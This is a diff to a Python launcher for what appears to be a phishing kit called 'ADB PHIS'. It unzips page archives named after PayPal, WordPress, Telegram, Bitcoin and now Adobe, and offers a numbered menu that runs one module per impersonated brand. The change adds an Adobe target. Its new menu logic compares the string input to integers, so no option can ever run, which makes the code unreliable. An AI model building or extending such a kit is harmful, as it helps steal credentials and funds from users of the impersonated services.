@@ -6,6 +6,7 @@ os.system("unzip wordpress.zip")
 os.system("unzip paypal.zip")
 os.system("unzip telegram.zip")
 os.system("unzip BTC.zip")
+os.system("unzip adobe.zip")
 os.system("clear")
 out = pyfiglet.figlet_format("ADB PHIS", font="3-d")
 print(Fore.WHITE+"*"*70)
@@ -21,20 +22,23 @@ print(Fore.RED+"""
                          |_|                              |___/ 
                                                                 
 """)
-print(Fore.WHITE+"*"+Fore.GREEN+"[+]"+Fore.RED+"INSTAGRAM")
-print(Fore.WHITE+"*"+Fore.GREEN+"[+]"+Fore.RED+"telenumber")
-print(Fore.WHITE+"*"+Fore.GREEN+"[+]"+Fore.RED+"BTC")
-print(Fore.WHITE+"*"+Fore.GREEN+"[+]"+Fore.RED+"paypal")
-print(Fore.WHITE+"*"+Fore.GREEN+"[+]"+Fore.RED+"wordpress")
+print(Fore.WHITE+"*"+Fore.GREEN+"[1]"+Fore.RED+"INSTAGRAM")
+print(Fore.WHITE+"*"+Fore.GREEN+"[2]"+Fore.RED+"telenumber")
+print(Fore.WHITE+"*"+Fore.GREEN+"[3]"+Fore.RED+"BTC")
+print(Fore.WHITE+"*"+Fore.GREEN+"[4]"+Fore.RED+"paypal")
+print(Fore.WHITE+"*"+Fore.GREEN+"[5]"+Fore.RED+"wordpress")
+print(Fore.WHITE+"*"+Fore.GREEN+"[6]"+Fore.RED+"Adobe")
 print(Fore.WHITE+"*"*70)
 s =input(Fore.RED+"="+Fore.GREEN+"telenumber/instagram"+Fore.RED+">")
-if s == "instagram":
+if s ==1:
         os.system("python module2.py")
-if s == "telenumber":
+if s ==2:
         os.system("python module1.py")
-if s == "BTC":
+if s ==3:
         os.system("python module3.py")
-if s == "paypal":
+if s ==4:
         os.system("python module4.py")
-if s == "wordpress":
+if s ==5:
         os.system("python module5.py")
+if s ==6:
+        os.system("python module6.py")
